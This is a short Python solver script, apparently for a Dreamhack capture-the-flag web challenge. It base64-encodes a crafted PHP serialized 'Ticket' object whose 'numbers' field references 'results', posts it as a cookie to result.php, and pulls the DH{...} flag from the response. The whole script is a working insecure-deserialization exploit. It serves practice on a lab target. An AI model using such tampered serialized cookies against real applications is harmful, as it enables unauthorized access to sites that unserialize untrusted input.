import requests
import re
import base64

HOST = "http://host1.dreamhack.games"
PORT = 12345

deserialized = b'O:6:"Ticket":2:{s:7:"results";a:0:{}s:7:"numbers";R:2;}'
ticket = base64.b64encode(deserialized)
res = requests.post(f"{HOST}:{PORT}/result.php", cookies={"ticket": ticket.decode()})
flag = re.search(r"DH{.*}", res.text).group()
print(flag)
